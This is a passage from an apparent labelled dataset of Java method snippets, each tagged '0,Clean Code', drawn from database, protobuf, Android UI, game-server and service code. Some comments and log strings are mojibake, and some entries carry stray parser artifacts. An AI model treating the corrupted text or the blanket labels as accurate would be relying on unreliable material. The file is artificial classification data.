      close(conn);
    }
    throw new SQLException(""Null SQL statement"");
  }
  if (params == null) {
    if (closeConn) {
      close(conn);
    }
    throw new SQLException(""Null parameters. If parameters aren't need, pass an empty array."");
  }
  PreparedStatement stmt=null;
  try {
    try {
      stmt=this.prepareStatement(conn,sql,Statement.RETURN_GENERATED_KEYS);
    }
 catch (    SQLFeatureNotSupportedException e) {
      stmt=this.prepareStatement(conn,sql);
    }
    for (int i=0; i < params.length; i++) {
      this.fillStatement(stmt,params[i]);
      stmt.addBatch();
    }
    return stmt.executeBatch();
  }
 catch (  SQLException e) {
    this.rethrow(e,sql,(Object[])params);
  }
 finally {
    close(stmt);
    if (closeConn) {
      close(conn);
    }
  }
  return new int[0];
}",0,Clean Code
"/** 
 * <code>optional uint32 talent_id = 12;</code>
 * @return whether the talentId field is set
 */
public boolean hasTalentId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public int getRecommendType(){
  return this.mInfo.getRecommendType();
}
",0,Clean Code
"protected int computeScrollDeltaToGetChildRectOnScreenH(Rect rect){
  if (getChildCount() == 0)   return 0;
  int width=getWidth();
  int screenLeft=getScrollX();
  int screenRight=screenLeft + width;
  int fadingEdge=getHorizontalFadingEdgeLength();
  if (rect.left > 0) {
    screenLeft+=fadingEdge;
  }
  if (rect.right < getChildAt(0).getWidth()) {
    screenRight-=fadingEdge;
  }
  int scrollXDelta=0;
  if (rect.right > screenRight && rect.left > screenLeft) {
    if (rect.width() > width) {
      scrollXDelta+=(rect.left - screenLeft);
    }
 else {
      scrollXDelta+=(rect.right - screenRight);
    }
    int right=getChildAt(0).getRight();
    int distanceToRight=right - screenRight;
    scrollXDelta=Math.min(scrollXDelta,distanceToRight);
  }
 else   if (rect.left < screenLeft && rect.right < screenRight) {
    if (rect.width() > width) {
      scrollXDelta-=(screenRight - rect.right);
    }
 else {
      scrollXDelta-=(screenLeft - rect.left);
    }
    scrollXDelta=Math.max(scrollXDelta,-getScrollX());
  }
  return scrollXDelta;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.EnsembleCombinerProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.EnsembleCombinerProto other=(org.tribuo.protos.core.EnsembleCombinerProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public static void recordExternalPayloadStorageUsage(String name,String operation,String payloadType){
  counter(classQualifier,""external_payload_storage_usage"",""name"",name,""operation"",operation,""payloadType"",payloadType);
}
",0,Clean Code
"@PostMapping(produces=TEXT_PLAIN_VALUE) @Operation(summary=""Update a task"") public String updateTask(@RequestBody TaskResult taskResult){
  return taskService.updateTask(taskResult);
}
@PostMapping(value=""/{workflowId}/{taskRefName}/{status}"",produces=TEXT_PLAIN_VALUE) @Operation(summary=""Update a task By Ref Name"") public String updateTask(@PathVariable(""workflowId"") String workflowId,@PathVariable(""taskRefName"") String taskRefName,@PathVariable(""status"") TaskResult.Status status,@RequestParam(value=""workerid"",required=false) String workerId,@RequestBody Map<String,Object> output){
  return taskService.updateTask(workflowId,taskRefName,status,workerId,output);
}
",0,Clean Code
"protected void put(String url,Object[] queryParams,Object request,Object... uriVariables){
  URI uri=null;
  try {
    uri=getURIBuilder(root + url,queryParams).build(uriVariables);
    requestHandler.getWebResourceBuilder(uri,request).put();
  }
 catch (  RuntimeException e) {
    handleException(uri,e);
  }
}
",0,Clean Code
"@Override public TextJoinQueryCsReq create(){
  return TextJoinQueryCsReq.newInstance();
}
",0,Clean Code
"public void handle(GameSession session,int cmdId,byte[] data){
  PacketHandler handler=this.handlers.get(cmdId);
  if (handler != null) {
    long timestamp=System.currentTimeMillis();
    if (session.getPacketCooldown().get(cmdId) >= timestamp && !CmdIdUtils.ALLOWED_FILTER_PACKETS.contains(cmdId)) {
      return;
    }
 else {
      session.getPacketCooldown().put(cmdId,timestamp + 5);
    }
    try {
      SessionState state=session.getState();
      if (cmdId == CmdId.PlayerHeartBeatCsReq) {
      }
 else       if (cmdId == CmdId.PlayerGetTokenCsReq) {
        if (state != SessionState.WAITING_FOR_TOKEN) {
          return;
        }
      }
 else       if (cmdId == CmdId.PlayerLoginCsReq) {
        if (state != SessionState.WAITING_FOR_LOGIN) {
          return;
        }
      }
 else {
        if (state != SessionState.ACTIVE) {
          return;
        }
      }
      handler.handle(session,data);
    }
 catch (    Exception ex) {
      ex.printStackTrace();
    }
  }
}",0,Clean Code
"@Override public SyncRogueCommonActionResultScNotify clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  actionResultList.clearQuick();
  return this;
}",0,Clean Code
"public void setupRound(StoryEntry entry,RoundView roundView,boolean animated){
  if (entry == null || entry.round == null) {
    if (roundPlayer != null) {
      roundPlayer.pause();
      roundPlayer.releasePlayer(true);
      roundPlayer=null;
    }
    if (timelineView != null) {
      timelineView.setRoundNull(animated);
    }
    this.roundView=null;
    AndroidUtilities.cancelRunOnUIThread(updateProgressRunnable);
  }
 else {
    if (roundPlayer != null) {
      roundPlayer.releasePlayer(true);
      roundPlayer=null;
    }
    roundPlayer=new VideoPlayer();
    roundPlayer.allowMultipleInstances=true;
    roundPlayer.setDelegate(new VideoPlayer.VideoPlayerDelegate(){
      @Override public void onStateChanged(      boolean playWhenReady,      int playbackState){
        if (roundPlayer == null) {
          return;
        }
        if (roundPlayer != null && roundPlayer.isPlaying()) {
          AndroidUtilities.runOnUIThread(updateRoundProgressRunnable);
        }
 else {
          AndroidUtilities.cancelRunOnUIThread(updateRoundProgressRunnable);
        }
      }
      @Override public void onError(      VideoPlayer player,      Exception e){
      }
      @Override public void onVideoSizeChanged(      int width,      int height,      int unappliedRotationDegrees,      float pixelWidthHeightRatio){
        roundPlayerWidth=width;
        roundPlayerHeight=height;
        if (PreviewView.this.roundView != null) {
          PreviewView.this.roundView.resizeTextureView(width,height);
        }
      }
      @Override public void onRenderedFirstFrame(){
      }
      @Override public void onSurfaceTextureUpdated(      SurfaceTexture surfaceTexture){
      }
      @Override public boolean onSurfaceDestroyed(      SurfaceTexture surfaceTexture){
        return false;
      }
    }
);
    Uri uri=Uri.fromFile(entry.round);
    roundPlayer.preparePlayer(uri,""other"");
    checkVolumes();
    attachRoundView(roundView);
    timelineView.setRound(entry.round.getAbsolutePath(),entry.roundDuration,entry.roundOffset,entry.roundLeft,entry.roundRight,entry.roundVolume,animated);
    updateRoundPlayer(true);
  }
}
",0,Clean Code
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  Intent intent=getIntent();
  String[] permissions=intent.getStringArrayExtra(INTENT_EXTRA_PERMISSIONS);
  if (permissions.length == 0)   finish();
  _requestCode=intent.getIntExtra(INTENT_EXTRA_REQUEST_CODE,-1);
  if (_requestCode == -1)   finish();
  _permissionListener=PermissionsUtil.getPermissionListener(_requestCode);
  for (  String permission : permissions) {
    if (permission == null || permission.isEmpty()) {
      throw new RuntimeException(""permission can't be null or empty"");
    }
    if (ContextCompat.checkSelfPermission(this,permission) == PERMISSION_GRANTED) {
      _permissions_granted.add(permission);
    }
 else {
      _permissions_denied.add(permission);
    }
  }
  if (_permissions_denied.isEmpty()) {
    if (_permissions_granted.isEmpty()) {
      throw new RuntimeException(""there are no permissions"");
    }
 else {
      if (_permissionListener != null) {
        _permissionListener.onPermissionGranted(_permissions_granted.toArray(new String[0]));
      }
      finish();
    }
  }
 else {
    ActivityCompat.requestPermissions(this,_permissions_denied.toArray(new String[0]),_requestCode);
  }
}",0,Clean Code
"void execute() throws Exception ;
",0,Clean Code
"@Override public int hashCode(){
  return Longs.hashCode(address);
}
",0,Clean Code
"private DenseTensorProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private DenseTensorProto(){
  dimensions_=emptyIntList();
  values_=com.google.protobuf.ByteString.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@138504bf",0,Clean Code
"/** 
 * @return factory for creating SelectRogueMiracleScRsp messages
 */
public static MessageFactory<SelectRogueMiracleScRsp> getFactory(){
  return SelectRogueMiracleScRspFactory.INSTANCE;
}
",0,Clean Code
"private static Query mapGreaterThan(IsGreaterThan isGreaterThan){
  return new Query.Builder().bool(b -> b.filter(f -> f.range(r -> r.field(""metadata."" + isGreaterThan.key()).gt(JsonData.of(isGreaterThan.comparisonValue()))))).build();
}
",0,Clean Code
"public static boolean isOk(Expectation expectation){
switch (expectation.type) {
case ""ok"":
    return true;
case ""array"":
  for (  Expectation exp : (Expectation[])expectation.value) {
    if (!isOk(exp))     return false;
  }
return true;
case ""map"":
for (Expectation exp : ((HashMap<String,Expectation>)expectation.value).values()) {
if (!isOk(exp)) return false;
}
return true;
}
return false;
}
",0,Clean Code
"public Bar(){
  f1=1;
  f2=""str"";
}",0,Clean Code
"@Override public long getU64guildSeq(){
  return 0;
}",0,Clean Code
"/** 
 * <code>optional uint32 leader_slot = 12;</code>
 * @return this
 */
public ReplaceLineupCsReq clearLeaderSlot(){
  bitField0_&=~0x00000004;
  leaderSlot=0;
  return this;
}",0,Clean Code
"/** 
 * <code>repeated .LineupAvatar avatar_list = 15;</code>
 * @param value the avatarList to add
 * @return this
 */
public LineupInfo addAvatarList(final LineupAvatarOuterClass.LineupAvatar value){
  bitField0_|=0x00000100;
  avatarList.add(value);
  return this;
}",0,Clean Code
"/** 
 * @param name the name to set
 */
public void setName(String name){
  this.name=name;
}
",0,Clean Code
"/** 
 * <code>repeated .AvatarBattleInfo battle_avatar_list = 7;</code>
 * @param values the battleAvatarList to add
 * @return this
 */
public BattleStatistics addAllBattleAvatarList(final AvatarBattleInfoOuterClass.AvatarBattleInfo... values){
  bitField0_|=0x00001000;
  battleAvatarList.addAll(values);
  return this;
}",0,Clean Code
"@Override public ExchangeHcoinCsReq copyFrom(final ExchangeHcoinCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    num=other.num;
  }
  return this;
}",0,Clean Code
"public void copyFrom(PBField<List<T>> pBField){
}
",0,Clean Code
"@Override public String getName(){
  return name;
}
",0,Clean Code
"@ExceptionHandler(value=MyBatisSystemException.class) public Result<String> mybatisException(MyBatisSystemException ex){
  log.error(""榛樿寮傚父闇�瑕佸鐞�"",ex);
  CrmException crmException=checkCrmException(ex,Const.AUTH_DATA_RECURSION_NUM);
  if (crmException != null) {
    return Result.error(crmException.getCode(),crmException.getMsg());
  }
  return Result.error(SystemCodeEnum.SYSTEM_ERROR);
}
",0,Clean Code
"@Override public void insertString(final DocumentFilter.FilterBypass fb,final int offset,final String string,final AttributeSet attr) throws BadLocationException {
  if (isValid(string,0)) {
    super.insertString(fb,offset,string,attr);
  }
}",0,Clean Code
"/** 
 * <code>optional .RogueMiracleSource source = 15;</code>
 * @return the source
 */
public RogueMiracleSourceOuterClass.RogueMiracleSource getSource(){
  return RogueMiracleSourceOuterClass.RogueMiracleSource.forNumber(source);
}",0,Clean Code
"@Override protected void startSet(VmSet value){
  increaseIndent();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.onnx.protos.ONNXExternalModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.onnx.protos.ONNXExternalModelProto other=(org.tribuo.interop.onnx.protos.ONNXExternalModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getForwardFeatureMappingList().equals(other.getForwardFeatureMappingList()))   return false;
  if (!getBackwardFeatureMappingList().equals(other.getBackwardFeatureMappingList()))   return false;
  if (!getModelArray().equals(other.getModelArray()))   return false;
  if (!getInputName().equals(other.getInputName()))   return false;
  if (hasOutputTransformer() != other.hasOutputTransformer())   return false;
  if (hasOutputTransformer()) {
    if (!getOutputTransformer().equals(other.getOutputTransformer()))     return false;
  }
  if (hasExampleTransformer() != other.hasExampleTransformer())   return false;
  if (hasExampleTransformer()) {
    if (!getExampleTransformer().equals(other.getExampleTransformer()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private void updateContextViewPosition(){
  float filtersTabsHeight=0;
  if (filterTabsView != null && filterTabsView.getVisibility() != View.GONE) {
    filtersTabsHeight=filterTabsView.getMeasuredHeight();
  }
  float searchTabsHeight=0;
  if (searchTabsView != null && searchTabsView.getVisibility() != View.GONE) {
    searchTabsHeight=searchTabsView.getMeasuredHeight();
  }
  float storiesHeight=0;
  if (hasStories) {
    storiesHeight=dp(DialogStoriesCell.HEIGHT_IN_DP);
  }
  float totalOffset;
  if (hasStories) {
    totalOffset=scrollYOffset * (1f - searchAnimationProgress) + storiesHeight * (1f - searchAnimationProgress) + filtersTabsHeight * (1f - searchAnimationProgress) + searchTabsHeight * searchAnimationProgress + tabsYOffset;
  }
 else {
    totalOffset=scrollYOffset + filtersTabsHeight * (1f - searchAnimationProgress) + searchTabsHeight * searchAnimationProgress + tabsYOffset;
  }
  totalOffset+=storiesOverscroll;
  if (dialogsHintCell != null && dialogsHintCell.getVisibility() == View.VISIBLE) {
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.hasFragment()) {
      totalOffset-=dialogsHintCell.getMeasuredHeight() * rightSlidingDialogContainer.openedProgress;
    }
    dialogsHintCell.setTranslationY(totalOffset);
    totalOffset+=dialogsHintCell.getMeasuredHeight() * (1f - searchAnimationProgress);
  }
  if (authHintCell != null && authHintCell.getVisibility() == View.VISIBLE) {
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.hasFragment()) {
      totalOffset-=authHintCell.getMeasuredHeight() * rightSlidingDialogContainer.openedProgress;
    }
    float authHintCellTranslation=authHintCell.getMeasuredHeight() * (1f - authHintCellProgress);
    authHintCell.setTranslationY(-authHintCellTranslation + totalOffset);
    totalOffset+=authHintCell.getMeasuredHeight() - authHintCellTranslation;
  }
  if (fragmentContextView != null) {
    float from=0;
    if (fragmentLocationContextView != null && fragmentLocationContextView.getVisibility() == View.VISIBLE) {
      from+=dp(36);
    }
    fragmentContextView.setTranslationY(from + fragmentContextView.getTopPadding() + totalOffset);
  }
  if (fragmentLocationContextView != null) {
    float from=0;
    if (fragmentContextView != null && fragmentContextView.getVisibility() == View.VISIBLE) {
      from+=dp(fragmentContextView.getStyleHeight()) + fragmentContextView.getTopPadding();
    }
    fragmentLocationContextView.setTranslationY(from + fragmentLocationContextView.getTopPadding() + totalOffset);
  }
}",0,Clean Code
"/** 
 * 鍒犻櫎涓嶆敮鎸佸鍏ョ殑瀛楁
 * @return true涓轰笉鏀寔瀵煎叆
 */
public static boolean removeFieldByType(Integer type){
  return TYPE_LIST.contains(type);
}
",0,Clean Code
"private void assertThatAPIKeyCheckPasses(HttpServletRequest req) throws ServletException, TenantOrAppNotFoundException {
  String apiKey=req.getHeader(""api-key"");
  String[] keys=Config.getConfig(new TenantIdentifier(getConnectionUriDomain(req),getAppId(req),getTenantId(req)),this.main).getAPIKeys();
  if (keys != null) {
    if (apiKey == null) {
      throw new ServletException(new APIKeyUnauthorisedException());
    }
    apiKey=apiKey.trim();
    boolean isAuthorised=false;
    for (    String key : keys) {
      isAuthorised=isAuthorised || key.equals(apiKey);
    }
    if (isAuthorised) {
      return;
    }
  }
  String superTokensSaaSSecret=Config.getConfig(new TenantIdentifier(null,null,null),this.main).getSuperTokensSaaSSecret();
  if (superTokensSaaSSecret != null) {
    if (apiKey == null) {
      throw new ServletException(new APIKeyUnauthorisedException());
    }
    if (apiKey.equals(superTokensSaaSSecret)) {
      return;
    }
  }
  if (superTokensSaaSSecret != null || keys != null) {
    throw new ServletException(new APIKeyUnauthorisedException());
  }
}
",0,Clean Code
"void getChannelFreqLimitInfo(@Nullable Contact contact);
",0,Clean Code
"public GGProRecommendsV2Feed(GProRecommendsV2Feed gProRecommendsV2Feed){
  this.mInfo=gProRecommendsV2Feed;
}",0,Clean Code
"public abstract MistralAiChatCompletionResponse chatCompletion(MistralAiChatCompletionRequest request);
",0,Clean Code
"@Override public StartCocoonStageCsReq clone(){
  return new StartCocoonStageCsReq().copyFrom(this);
}
",0,Clean Code
"public boolean isNameValue(){
  return this.nameVal != null;
}
",0,Clean Code
"public Builder sampleImageStyle(ImageStyle sampleImageStyle){
  this.sampleImageStyle=sampleImageStyle;
  return this;
}
",0,Clean Code
"public static String getTruncatedCommandOutput(String text,int maxLength,boolean fromEnd,boolean onNewline,boolean addPrefix){
  if (text == null)   return null;
  String prefix=""(truncated) "";
  if (addPrefix)   maxLength=maxLength - prefix.length();
  if (maxLength < 0 || text.length() < maxLength)   return text;
  if (fromEnd) {
    text=text.substring(0,maxLength);
  }
 else {
    int cutOffIndex=text.length() - maxLength;
    if (onNewline) {
      int nextNewlineIndex=text.indexOf('\n',cutOffIndex);
      if (nextNewlineIndex != -1 && nextNewlineIndex != text.length() - 1) {
        cutOffIndex=nextNewlineIndex + 1;
      }
    }
    text=text.substring(cutOffIndex);
  }
  if (addPrefix)   text=prefix + text;
  return text;
}",0,Clean Code
"/** 
 * 璐ｄ换閾句笂涓嬫枃
 */
@Bean public AbstractChainContext abstractChainContext(){
  return new AbstractChainContext();
}
",0,Clean Code
"@Override public ComposeSelectedRelicScRsp mergeFrom(final ComposeSelectedRelicScRsp other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRetcode()) {
    setRetcode(other.retcode);
  }
  if (other.hasComposeId()) {
    setComposeId(other.composeId);
  }
  if (other.hasReturnItemList()) {
    getMutableReturnItemList().mergeFrom(other.returnItemList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@f1ad426!org.eclipse.jdt.core.dom.MethodDeclaration@734b5877",0,Clean Code
"/** 
 * Use  {@link Preconditions} to check for required {@link TaskDef} fields, throwing a Runtimeexception if validations fail.
 * @param taskDef The {@code TaskDef} to check.
 */
private void validate(TaskDef taskDef){
  Preconditions.checkNotNull(taskDef,""TaskDef object cannot be null"");
  Preconditions.checkNotNull(taskDef.getName(),""TaskDef name cannot be null"");
}
/** 
 * Use  {@link Preconditions} to check for required {@link WorkflowDef} fields, throwing aRuntime exception if validations fail.
 * @param def The {@code WorkflowDef} to check.
 */
private void validate(WorkflowDef def){
  Preconditions.checkNotNull(def,""WorkflowDef object cannot be null"");
  Preconditions.checkNotNull(def.getName(),""WorkflowDef name cannot be null"");
}
",0,Clean Code
"public void removeFromPendingWorkflow(String workflowType,String workflowId){
  executionDAO.removeFromPendingWorkflow(workflowType,workflowId);
}
",0,Clean Code
"private void onSlideAnimationEnd(final boolean backAnimation){
  if (!backAnimation) {
    if (fragmentsStack.size() < 2) {
      return;
    }
    BaseFragment lastFragment=fragmentsStack.get(fragmentsStack.size() - 1);
    lastFragment.prepareFragmentToSlide(true,false);
    lastFragment.onPause();
    lastFragment.onFragmentDestroy();
    lastFragment.setParentLayout(null);
    fragmentsStack.remove(fragmentsStack.size() - 1);
    onFragmentStackChanged(""onSlideAnimationEnd"");
    LayoutContainer temp=containerView;
    containerView=containerViewBack;
    containerViewBack=temp;
    bringChildToFront(containerView);
    lastFragment=fragmentsStack.get(fragmentsStack.size() - 1);
    currentActionBar=lastFragment.actionBar;
    lastFragment.onResume();
    lastFragment.onBecomeFullyVisible();
    lastFragment.prepareFragmentToSlide(false,false);
    layoutToIgnore=containerView;
  }
 else {
    if (fragmentsStack.size() >= 2) {
      BaseFragment lastFragment=fragmentsStack.get(fragmentsStack.size() - 1);
      lastFragment.prepareFragmentToSlide(true,false);
      lastFragment=fragmentsStack.get(fragmentsStack.size() - 2);
      lastFragment.prepareFragmentToSlide(false,false);
      lastFragment.onPause();
      if (lastFragment.fragmentView != null) {
        ViewGroup parent=(ViewGroup)lastFragment.fragmentView.getParent();
        if (parent != null) {
          lastFragment.onRemoveFromParent();
          parent.removeViewInLayout(lastFragment.fragmentView);
        }
      }
      if (lastFragment.actionBar != null && lastFragment.actionBar.shouldAddToContainer()) {
        ViewGroup parent=(ViewGroup)lastFragment.actionBar.getParent();
        if (parent != null) {
          parent.removeViewInLayout(lastFragment.actionBar);
        }
      }
      lastFragment.detachStoryViewer();
    }
    layoutToIgnore=null;
  }
  containerViewBack.setVisibility(View.INVISIBLE);
  startedTracking=false;
  animationInProgress=false;
  containerView.setTranslationX(0);
  containerViewBack.setTranslationX(0);
  setInnerTranslationX(0);
}",0,Clean Code
"/** 
 * Intercept the target instance method.
 * @param obj          target class instance.
 * @param allArguments all method arguments
 * @param method       method description.
 * @param zuper        the origin call ref.
 * @return the return value of target instance method.
 * @throws Exception only throw exception because of zuper.call() or unexpected exception in sky-walking ( This is abug, if anything triggers this condition ).
 */
@RuntimeType public static Object intercept(@This Object obj,@AllArguments Object[] allArguments,@SuperCall Callable<?> zuper,@Origin Method method) throws Throwable {
  EnhancedInstance targetObject=(EnhancedInstance)obj;
  prepare();
  MethodInterceptResult result=new MethodInterceptResult();
  try {
    if (INTERCEPTOR != null) {
      INTERCEPTOR.beforeMethod(targetObject,method,allArguments,method.getParameterTypes(),result);
    }
  }
 catch (  Throwable t) {
    if (LOGGER != null) {
      LOGGER.error(t,""class[{}] before method[{}] intercept failure"",obj.getClass(),method.getName());
    }
  }
  Object ret=null;
  try {
    if (!result.isContinue()) {
      ret=result._ret();
    }
 else {
      ret=zuper.call();
    }
  }
 catch (  Throwable t) {
    try {
      if (INTERCEPTOR != null) {
        INTERCEPTOR.handleMethodException(targetObject,method,allArguments,method.getParameterTypes(),t);
      }
    }
 catch (    Throwable t2) {
      if (LOGGER != null) {
        LOGGER.error(t2,""class[{}] handle method[{}] exception failure"",obj.getClass(),method.getName());
      }
    }
    throw t;
  }
 finally {
    try {
      if (INTERCEPTOR != null) {
        ret=INTERCEPTOR.afterMethod(targetObject,method,allArguments,method.getParameterTypes(),ret);
      }
    }
 catch (    Throwable t) {
      if (LOGGER != null) {
        LOGGER.error(t,""class[{}] after method[{}] intercept failure"",obj.getClass(),method.getName());
      }
    }
  }
  return ret;
}",0,Clean Code
"/** 
 * okhttpclient
 */
private OkHttpClient okHttpClient(){
  OkHttpClient okHttpClient=new OkHttpClient.Builder().addInterceptor(new FastChatHeaderAuthorizationInterceptor(this.apiKey)).connectTimeout(10,TimeUnit.SECONDS).writeTimeout(50,TimeUnit.SECONDS).readTimeout(50,TimeUnit.SECONDS).build();
  return okHttpClient;
}
public FastChatAIStreamClient.Builder okHttpClient(OkHttpClient val){
  this.okHttpClient=val;
  return this;
}",0,Clean Code
"public static int convertCharToLogLevel(char logLevelChar){
switch (logLevelChar) {
case 'A':
    return Log.ASSERT;
case 'D':
  return Log.DEBUG;
case 'E':
return Log.ERROR;
case 'I':
return Log.INFO;
case 'V':
return Log.VERBOSE;
case 'W':
return Log.WARN;
case 'F':
return LOG_FATAL;
}
return -1;
}",0,Clean Code
"@Override public Long zcard(String key){
  return executeInJedis(jedis -> jedis.zcard(key));
}
",0,Clean Code
"protected Resp handleFunctionCallOrReturn(Req request,Resp response){
  if (!this.isToolFunctionCall(response)) {
    return response;
  }
  List<Msg> conversationHistory=new ArrayList<>();
  conversationHistory.addAll(this.doGetUserMessages(request));
  Msg responseMessage=this.doGetToolResponseMessage(response);
  conversationHistory.add(responseMessage);
  Req newRequest=this.doCreateToolResponseRequest(request,responseMessage,conversationHistory);
  return this.callWithFunctionSupport(newRequest);
}
",0,Clean Code
"private void visit(YCQLConstant constant){
  sb.append(constant.toString());
}
private void visit(YCQLSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
",0,Clean Code
"public String getEncodingFormat(){
  return this.encodingFormat;
}
",0,Clean Code
"/** 
 * 鑾峰彇鏂囦欢鍚�
 */
public static String getFileName(String template,String className,String packageName,String moduleName){
  String packagePath=""main"" + File.separator + ""java""+ File.separator;
  if (StringUtils.isNotBlank(packageName)) {
    packagePath+=packageName.replace(""."",File.separator) + File.separator + moduleName+ File.separator;
  }
  if (template.contains(""Entity.java.vm"")) {
    return packagePath + ""entity"" + File.separator+ className+ ""Entity.java"";
  }
  if (template.contains(""Dao.java.vm"")) {
    return packagePath + ""dao"" + File.separator+ className+ ""Dao.java"";
  }
  if (template.contains(""Service.java.vm"")) {
    return packagePath + ""service"" + File.separator+ className+ ""Service.java"";
  }
  if (template.contains(""ServiceImpl.java.vm"")) {
    return packagePath + ""service"" + File.separator+ ""impl""+ File.separator+ className+ ""ServiceImpl.java"";
  }
  if (template.contains(""Controller.java.vm"")) {
    return packagePath + ""controller"" + File.separator+ className+ ""Controller.java"";
  }
  if (template.contains(""Dao.xml.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""mapper""+ File.separator+ moduleName+ File.separator+ className+ ""Dao.xml"";
  }
  if (template.contains(""menu.sql.vm"")) {
    return className.toLowerCase() + ""_menu.sql"";
  }
  if (template.contains(""index.vue.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""src""+ File.separator+ ""views""+ File.separator+ ""modules""+ File.separator+ moduleName+ File.separator+ className.toLowerCase()+ "".vue"";
  }
  if (template.contains(""add-or-update.vue.vm"")) {
    return ""main"" + File.separator + ""resources""+ File.separator+ ""src""+ File.separator+ ""views""+ File.separator+ ""modules""+ File.separator+ moduleName+ File.separator+ className.toLowerCase()+ ""-add-or-update.vue"";
  }
  return null;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof GetMissionStatusCsReq)) {
    return false;
  }
  GetMissionStatusCsReq other=(GetMissionStatusCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasSubMissionIdList() || subMissionIdList.equals(other.subMissionIdList)) && (!hasMissionEventIdList() || missionEventIdList.equals(other.missionEventIdList)) && (!hasMainMissionIdList() || mainMissionIdList.equals(other.mainMissionIdList));
}",0,Clean Code
"public static QwenLanguageModelBuilder builder(){
  for (  QwenLanguageModelBuilderFactory factory : loadFactories(QwenLanguageModelBuilderFactory.class)) {
    return factory.get();
  }
  return new QwenLanguageModelBuilder();
}
",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public OperationResult updateSalary(List<UpdateSalaryBO> updateSalaryBOList){
  List<HrmSalaryMonthOptionValue> salaryMonthOptionValueList=new ArrayList<>();
  updateSalaryBOList.forEach(updateSalaryBO -> {
    Long sEmpRecordId=updateSalaryBO.getSEmpRecordId();
    HrmSalaryMonthEmpRecord salaryMonthEmpRecord=salaryMonthEmpRecordService.getById(sEmpRecordId);
    Map<Integer,String> map=updateSalaryBO.getSalaryValues();
    map.forEach((code,value) -> {
      salaryMonthOptionValueService.lambdaUpdate().set(HrmSalaryMonthOptionValue::getValue,value).eq(HrmSalaryMonthOptionValue::getCode,code).eq(HrmSalaryMonthOptionValue::getSEmpRecordId,sEmpRecordId).update();
    }
);
    List<HrmSalaryMonthOptionValue> salaryMonthOptionValues=computeSalary(salaryMonthEmpRecord,null);
    salaryMonthOptionValueList.addAll(salaryMonthOptionValues);
  }
);
  salaryMonthOptionValueService.saveBatch(salaryMonthOptionValueList);
  HrmSalaryMonthRecord salaryMonthRecord=queryLastSalaryMonthRecord();
  Map<String,Object> countMap=salaryMonthRecordMapper.queryMonthSalaryCount(salaryMonthRecord.getSRecordId());
  BeanUtil.fillBeanWithMap(countMap,salaryMonthRecord,true);
  updateById(salaryMonthRecord);
  OperationLog operationLog=new OperationLog();
  operationLog.setOperationObject(salaryMonthRecord.getSRecordId(),salaryMonthRecord.getYear() + ""-"" + salaryMonthRecord.getTitle());
  operationLog.setOperationInfo(""缂栬緫钖祫鎶ヨ〃锛�"" + salaryMonthRecord.getYear() + ""-""+ salaryMonthRecord.getTitle());
  return null;
}
",0,Clean Code
"private Document recordToDocument(org.neo4j.driver.Record neoRecord){
  var node=neoRecord.get(""node"").asNode();
  var score=neoRecord.get(""score"").asFloat();
  var metaData=new HashMap<String,Object>();
  metaData.put(""distance"",1 - score);
  node.keys().forEach(key -> {
    if (key.startsWith(""metadata."")) {
      metaData.put(key.substring(key.indexOf(""."") + 1),node.get(key).asObject());
    }
  }
);
  return new Document(node.get(this.config.idProperty).asString(),node.get(""text"").asString(),Map.copyOf(metaData));
}",0,Clean Code
"@Override public void clearConfigCache(){
  Collection<String> keys=redisCache.keys(CacheConstants.SYS_CONFIG_KEY + ""*"");
  redisCache.deleteObject(keys);
}
",0,Clean Code
"@Override public void onNotifyMissed(){
  Serializer<?> fieldSerializer=fury.getClassResolver().getSerializer(beanFieldType);
  ReflectionUtils.setObjectFieldValue(subclassSerializer,field,fieldSerializer);
}
",0,Clean Code
"@Test void should_return_web_results_with_geolocation(){
  String searchTerm=""Who is the current president?"";
